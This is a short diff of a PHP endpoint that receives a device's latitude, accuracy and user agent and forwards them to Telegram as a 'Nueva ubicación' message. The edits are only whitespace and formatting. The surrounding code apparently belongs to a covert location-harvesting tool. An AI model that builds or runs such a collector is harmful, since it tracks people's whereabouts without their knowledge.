@@ -8,9 +8,9 @@ $raw = file_get_contents('php://input');
 $payload = json_decode($raw, true);
 
 if (!is_array($payload)) {
-  http_response_code(400);
-  echo json_encode(['status' => 'bad_request']);
-  exit;
+    http_response_code(400);
+    echo json_encode(['status' => 'bad_request']);
+    exit;
 }
 
 $lat = $payload['latitude'] ?? null;
@@ -28,6 +28,7 @@ $msg = "📍 <b>Nueva ubicación</b>\n".
        "🎯 Precisión: {$acc}m\n".
        "🖥️ UA: $ua\n".
        "⏰ Hora: $ts";
+
 send_to_telegram($msg);
 
-echo json_encode(['status' => 'logged', 'timestamp' => $ts]);
+echo json_encode(['status'=>'logged','timestamp'=>$ts]);
